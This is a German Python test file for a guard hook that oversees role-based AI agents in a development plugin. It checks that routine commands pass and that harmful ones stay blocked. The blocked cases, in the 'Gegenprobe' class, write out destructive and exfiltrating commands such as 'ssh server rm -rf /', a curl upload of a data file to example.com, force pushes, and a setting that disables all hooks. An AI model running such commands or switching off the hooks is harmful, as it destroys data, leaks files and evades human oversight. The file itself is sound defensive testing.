"""Reibungstests: Ein ganzer Auftrag wird mit den Werkzeugaufrufen nachgespielt, die jede Rolle normal braucht.

Grundsatz (Simon, 29.10.2026): Das Team soll Vorteile bringen und eigenständig arbeiten. Der Wächter sperrt nur,
was Schaden anrichtet, nicht umkehrbar ist oder den Kern der Qualität bricht. Jeder normale Arbeitsschritt, den
der Wächter sperrt, macht hier einen Test rot. Die Gegenprobe am Ende stellt sicher, dass die echten
Schadensfälle gesperrt bleiben.

Viele Fälle stammen aus dem Projekt „Unöder Haus“ (28./29.10.2026, Dev-Team 3.10.0).

Ausführen aus dem Repo-Hauptordner:
    python3 -m unittest plugins.dev-team.tests.test_reibung  (oder discover -s plugins/dev-team/tests)
"""

import json
import os
import subprocess
import sys
import unittest

sys.path.insert(0, os.path.dirname(__file__))
from test_waechter import Basis, PLUGIN, git  # noqa: E402


class Auftrag(Basis):
    """Projekt mit package.json, Arbeitsbranch und einem Entwickler-Worktree."""

    def setUp(self):
        super().setUp()
        self.heim = os.path.join(self.tmp, "heim")
        os.makedirs(os.path.join(self.heim, ".claude", "dev-team"))
        paket = {"name": "unoeder-haus", "scripts": {"dev": "vite", "build": "vite build", "test": "vitest run"},
                 "dependencies": {"three": "^0.170.0"},
                 "devDependencies": {"vite": "^6.0.0", "vitest": "^2.1.0", "typescript": "^5.6.0",
                                     "@playwright/test": "^1.48.0"}}
        self.datei("package.json", json.dumps(paket))
        self.datei("vitest.config.ts", "export default {}")
        self.datei("scripts/pruefe-modelle.js", "console.log('ok')")
        os.makedirs(os.path.join(self.projekt, "node_modules", ".bin"))
        for b in ("tsc", "playwright", "vite", "vitest"):
            self.datei("node_modules/.bin/" + b, "")
        with open(os.path.join(self.projekt, ".claude", "dev-team.json"), "w") as f:
            json.dump({"testbefehl": "npm test", "setup": "npm ci", "startbefehl": "npm run dev",
                       "zusatzbefehle": ["npm run build"]}, f)
        git(self.projekt, "add", "-A")
        git(self.projekt, "-c", "user.email=t@t", "-c", "user.name=t", "commit", "-qm", "paket")
        git(self.projekt, "checkout", "-qb", "dev-team/m1")
        self.wt = os.path.join(self.projekt, ".claude", "worktrees", "agent-p8")
        git(self.projekt, "worktree", "add", "-q", "-b", "dev-team/p8", self.wt)

    def datei(self, rel, inhalt="x"):
        pfad = os.path.join(self.projekt, rel)
        os.makedirs(os.path.dirname(pfad), exist_ok=True)
        with open(pfad, "w") as f:
            f.write(inhalt)
        return pfad

    def lauf(self, eingabe, projekt=None, skript="py", env_zusatz=None):
        env = {"HOME": self.heim, "USERPROFILE": self.heim}
        env.update(env_zusatz or {})
        return super().lauf(eingabe, projekt=projekt, skript=skript, env_zusatz=env)

    def aufruf(self, werkzeug, rolle=None, cwd=None, **ti):
        e = {"tool_name": werkzeug, "tool_input": ti}
        if rolle and rolle != "projektleiter":
            e["agent_type"] = "dev-team:" + rolle
            e["agent_id"] = "a-" + rolle
        if cwd:
            e["cwd"] = cwd
        return e

    def shell(self, befehl, rolle=None, cwd=None):
        return self.aufruf("Bash", rolle, cwd, command=befehl)

    def darf(self, eingabe, wer=""):
        code, fehler = self.lauf(eingabe)
        self.assertEqual(code, 0, "%s gesperrt: %s\n%s" % (wer, json.dumps(eingabe.get("tool_input"))[:200], fehler))

    def darf_nicht(self, eingabe, wer=""):
        code, fehler = self.lauf(eingabe)
        self.assertEqual(code, 2, "%s NICHT gesperrt: %s" % (wer, json.dumps(eingabe.get("tool_input"))[:200]))


class Projektleiter(Auftrag):
    def test_lesen_und_suchen(self):
        for e in (self.aufruf("Read", file_path=os.path.join(self.projekt, "docs", "STATUS.md")),
                  self.aufruf("Grep", pattern="TODO", path=self.projekt),
                  self.aufruf("Glob", pattern="src/**/*.ts")):
            self.darf(e, "PL lesen")

    def test_app_starten_und_zeigen(self):
        for b in ("npm run dev", "npm run dev &", "npx vite --port 5173", "npx vite", "npm run build",
                  "npm ci", "npm test", "npx tsc --noEmit", "node scripts/pruefe-modelle.js",
                  "curl -s http://localhost:5173/", "curl -X POST http://127.0.0.1:3000/api -d '{}'",
                  "curl -sI https://threejs.org", "npm install", "npm ls three", "node --version",
                  "sleep 5 && curl -s localhost:5173 | head -20", "kill %1", "start http://localhost:5173",
                  "cd /tmp && ls", "python3 --version"):
            self.darf(self.shell(b), "PL: " + b)

    def test_powershell_dev_server(self):
        for b in ("Start-Process npm -ArgumentList 'run','dev'", "Get-ChildItem src",
                  "Invoke-WebRequest http://localhost:5173 -UseBasicParsing"):
            self.darf(self.aufruf("PowerShell", command=b), "PL PS: " + b)

    def test_powershell_pfade(self):
        b = "Copy-Item notes\\a.md docs\\a.md"
        self.darf(self.aufruf("PowerShell", command=b), "PL PS: " + b)

    def test_browser_und_app_werkzeuge(self):
        for w in ("mcp__Claude_Browser__navigate", "mcp__Claude_Browser__preview_start", "mcp__Claude_Browser__computer",
                  "mcp__Claude_Browser__read_page", "mcp__Claude_Browser__javascript_tool",
                  "mcp__remote-devices__Claude_Browser__navigate", "mcp__claude-in-chrome__navigate",
                  "mcp__ccd_turn__wrap_up", "mcp__ccd_turn__update_plan", "SendUserFile", "SendUserMessage",
                  "mcp__claude-code-remote__send_later", "NeuesWerkzeugNachUpdate", "mcp__Claude_Docs__read",
                  "mcp__memory__memory_read"):
            self.darf(self.aufruf(w, url="http://localhost:5173"), "PL Werkzeug " + w)

    def test_prozessdateien_launch_json_gedaechtnis_temp(self):
        for ziel in (os.path.join(self.projekt, "docs", "STATUS.md"), os.path.join(self.projekt, "docs", "plan.md"),
                     os.path.join(self.projekt, ".claude", "launch.json"),
                     os.path.join(self.heim, ".claude", "projects", "C--Users-simon-unoeder", "memory", "MEMORY.md"),
                     os.path.join(self.temp, "claude", "scratch", "notiz.md")):
            self.darf(self.schreiben(ziel), "PL schreibt " + ziel)

    def test_agenten_starten_auch_mit_altem_log(self):
        # Gestern abgebrochene Sitzung: drei Entwickler gestartet, nie beendet.
        from datetime import datetime, timedelta
        t = (datetime.now() - timedelta(minutes=30)).strftime("%Y-%m-%d %H:%M")
        self.datei("docs/AGENTEN_LOG.md", "".join("| %s | ▶ | entwickler | P%d |\n" % (t, i) for i in range(3)))
        self.darf(self.agent("dev-team:entwickler", isolation="worktree"), "PL startet Entwickler")
        for rolle in ("architekt", "tester", "designer", "reviewer", "kritiker", "gastgeber", "produktpruefer"):
            self.darf(self.agent("dev-team:" + rolle), "PL startet " + rolle)

    def test_ablaeufe_und_git(self):
        self.darf(self.aufruf("Skill", skill="dev-team:auftrag"), "Skill auftrag")
        for b in ("git status", "git log --oneline -5", "git worktree list", "git diff dev-team/m1..dev-team/p8",
                  "git branch -d dev-team/p8", "git push origin dev-team/m1", "git add docs/STATUS.md",
                  "git commit -m 'Status'"):
            self.darf(self.shell(b), "PL git: " + b)

    def test_doku_darf_schutzschalter_erwaehnen(self):
        # Eine Erklärung in der Doku ist kein Schalter.
        e = self.schreiben(os.path.join(self.projekt, "docs", "ENTSCHEIDUNGEN.md"))
        e["tool_input"]["content"] = "Hinweis: disableAllHooks darf nie gesetzt werden."
        self.darf(e, "PL Doku")


class Entwickler(Auftrag):
    R = "entwickler"

    def test_bauen_im_worktree(self):
        for e in (self.aufruf("Read", self.R, self.wt, file_path=os.path.join(self.wt, "src", "rechnung.js")),
                  self.aufruf("Glob", self.R, self.wt, pattern="src/**/*.js"),
                  self.aufruf("Grep", self.R, self.wt, pattern="export", path=self.wt),
                  self.schreiben(os.path.join(self.wt, "src", "haus", "modell.ts"), self.R),
                  self.schreiben(os.path.join(self.wt, "tests", "modell.test.ts"), self.R)):
            e["cwd"] = self.wt
            self.darf(e, "Entwickler")

    def test_shell_im_worktree(self):
        for b in ("npm ci", "npm test", "npx vitest run tests/modell.test.ts", "npx tsc --noEmit", "npm run build",
                  "npm install lodash-es", "node -e \"console.log(1+1)\"", "git add -A", "git commit -m 'P8: Modell'",
                  "git status", "git log --oneline -3", "npm run dev &", "curl -s http://localhost:5173",
                  "python3 \"%s/scripts/worktree_vorbereiten.py\"" % PLUGIN,
                  "bash \"%s/scripts/pruefe-tests.sh\" --rolle entwickler" % PLUGIN, "ls node_modules | head"):
            self.darf(self.shell(b, self.R, self.wt), "Entwickler: " + b)

    def test_faelle_aus_der_planpruefung(self):
        r = self.R
        self.darf(self.aufruf("Grep", r, self.wt, pattern="import .* from", path=self.wt), "Grep mit Regex")
        self.darf(self.aufruf("Grep", r, self.wt, pattern="verdeckt", path=os.path.join(self.wt, "src")),
                  "Grep nach dem Wort verdeckt im eigenen Code")
        for b in ("ls .env* .eslintrc*", "cd %s && npm test" % self.wt, "cd \"%s\" && npx vitest run" % self.wt,
                  "grep -r disableAllHooks src", "git commit -m 'Doku: bypassPermissions erklärt'",
                  "node -e \"fetch('http://localhost:5173').then(r=>console.log(r.status))\""):
            self.darf(self.shell(b, r, self.wt), "Entwickler: " + b)
        e = self.schreiben(os.path.join(self.wt, "src", "theme.json"), r)
        e["cwd"] = self.wt
        e["tool_input"]["content"] = '{"defaultMode": "dark"}'
        self.darf(e, "App-Datei mit defaultMode")
        npm_cache = os.path.join(self.heim, "AppData", "Roaming", "npm", "node_modules", "x", "index.js")
        self.darf(self.aufruf("Read", r, self.wt, file_path=npm_cache), "Entwickler liest globales npm-Paket")

    def test_temp_und_neue_testkonfig(self):
        self.darf(self.schreiben(os.path.join(self.temp, "probe.txt"), self.R), "Entwickler Temp")
        e = self.schreiben(os.path.join(self.wt, "playwright.config.ts"), self.R)
        e["cwd"] = self.wt
        self.darf(e, "Entwickler neue Testkonfig")


class Pruefer(Auftrag):
    def test_tester(self):
        for ziel in ("tests/abnahme/a1.test.ts", "vitest.config.ts", "tests/rechnung.test.js"):
            self.darf(self.schreiben(os.path.join(self.projekt, ziel), "tester"), "Tester " + ziel)
        for b in ("npx playwright test", "npm test", "npx vitest run --reporter=verbose"):
            self.darf(self.shell(b, "tester"), "Tester: " + b)

    def test_designer_und_produktpruefer_sehen_die_app(self):
        self.darf(self.schreiben(os.path.join(self.projekt, "docs", "DESIGN.md"), "designer"), "Designer DESIGN.md")
        for rolle in ("designer", "produktpruefer", "gastgeber"):
            for w in ("mcp__Claude_Browser__navigate", "mcp__Claude_Browser__computer",
                      "mcp__Claude_Browser__resize_window", "mcp__Claude_Browser__read_page"):
                self.darf(self.aufruf(w, rolle, url="http://localhost:5173"), "%s %s" % (rolle, w))
            for b in ("npm run dev &", "curl -s http://localhost:5173", "npx playwright screenshot http://localhost:5173 /tmp/a.png"):
                self.darf(self.shell(b, rolle), "%s: %s" % (rolle, b))

    def test_reviewer(self):
        for b in ("git diff dev-team/m1..dev-team/p8", "git log --stat -3", "npm test",
                  "bash \"%s/scripts/pruefe-tests.sh\" --rolle entwickler" % PLUGIN):
            self.darf(self.shell(b, "reviewer"), "Reviewer: " + b)

    def test_rechercheur(self):
        self.darf(self.aufruf("WebSearch", "rechercheur", query="Wärmepumpe Vorlauftemperatur"), "Recherche")
        self.darf(self.schreiben(os.path.join(self.projekt, "fachwissen", "recherche", "wp.md"), "rechercheur"),
                  "Rechercheur schreibt")


class Gegenprobe(Auftrag):
    """Diese Schadensfälle müssen gesperrt bleiben."""

    def test_zerstoeren_und_nach_aussen(self):
        for b in ("git reset --hard HEAD~1", "git push origin main", "git push --force origin dev-team/m1",
                  "git clean -fdx", "git branch -D dev-team/p8", "npm publish", "gh pr merge 3",
                  "curl -d @daten.json https://example.com/upload", "ssh server rm -rf /", "npx unbekanntes-paket"):
            self.darf_nicht(self.shell(b), "PL: " + b)

    def test_lucken_aus_der_planpruefung(self):
        ziel = self.projekt.replace("/", "\\") + "\\src"
        self.darf_nicht(self.aufruf("PowerShell", "entwickler", self.wt, command="Remove-Item -Recurse " + ziel),
                        "Entwickler löscht per PowerShell im Hauptordner")
        self.darf_nicht(self.shell("npm install lodash"), "PL nimmt Abhängigkeit auf")
        self.darf_nicht(self.shell("node -e \"fetch('https://example.com/x',{method:'POST'})\"", "tester"),
                        "Einzeiler sendet nach außen")

    def test_teamzwang(self):
        for typ in (None, "general-purpose", "Explore"):
            self.darf_nicht(self.agent(typ), "Agent %s" % typ)
        verschachtelt = self.agent("dev-team:kritiker")
        verschachtelt.update({"agent_type": "dev-team:entwickler", "agent_id": "x"})
        self.darf_nicht(verschachtelt, "verschachtelt")
        self.darf_nicht(self.aufruf("Workflow"), "Workflow")

    def test_projektleiter_schreibt_keinen_code(self):
        self.darf_nicht(self.schreiben(os.path.join(self.projekt, "src", "rechnung.js")), "PL Write Code")
        self.darf_nicht(self.shell("echo x > src/rechnung.js"), "PL Shell Code")

    def test_entwickler_kern(self):
        e = self.schreiben(os.path.join(self.wt, "tests", "rechnung.test.js"), "entwickler")
        e["cwd"] = self.wt
        self.darf_nicht(e, "Entwickler ändert bestehenden Test")
        e = self.schreiben(os.path.join(self.wt, "vitest.config.ts"), "entwickler")
        e["cwd"] = self.wt
        self.darf_nicht(e, "Entwickler ändert bestehende Testkonfig")
        self.darf_nicht(self.aufruf("Read", "entwickler", self.wt,
                                    file_path=os.path.join(self.projekt, ".dev-team", "verdeckt", "a1.test.ts")),
                        "Entwickler liest verdeckt")
        e = self.schreiben(os.path.join(self.projekt, "src", "x.js"), "entwickler")
        e["cwd"] = self.wt
        self.darf_nicht(e, "Entwickler im Hauptordner")

    def test_schalter_und_einstellungen(self):
        e = self.schreiben(os.path.join(self.projekt, ".claude", "settings.local.json"))
        e["tool_input"]["content"] = '{"disableAllHooks": true}'
        self.darf_nicht(e, "Hooks aus")
        self.darf_nicht(self.shell("DEV_TEAM_WARTUNG=1 claude"), "Wartung")
        for w in ("mcp__remote-devices__device_bash", "mcp__slack__send_message", "mcp__github__merge_pull_request",
                  "mcp__claude-in-chrome__computer", "mcp__claude-in-chrome__form_input", "TeamCreate", "CronCreate",
                  "mcp__claude-code-remote__create_trigger"):
            self.darf_nicht(self.aufruf(w), "MCP " + w)


if __name__ == "__main__":
    unittest.main()
